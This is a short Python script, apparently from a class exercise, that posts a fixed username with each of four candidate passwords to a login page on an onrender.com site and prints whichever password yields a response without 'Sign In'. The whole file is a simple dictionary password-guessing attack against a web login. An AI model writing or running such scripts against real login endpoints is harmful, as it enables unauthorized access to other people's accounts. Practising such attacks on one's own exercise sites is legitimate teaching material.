import requests

list_of_paasswords =["dsgfgfh","jkhkjjkhjgk","Tirrgul26","Tirgul26"]

url = "https://sitexample.onrender.com/login"

for password in list_of_paasswords:
    data = {"username": "shalomv", "password": password}
    post_content = requests.post(url, data=data).text
    #if "Login successful!" in post_content:
    if "Sign In" not in post_content:
        print(password)

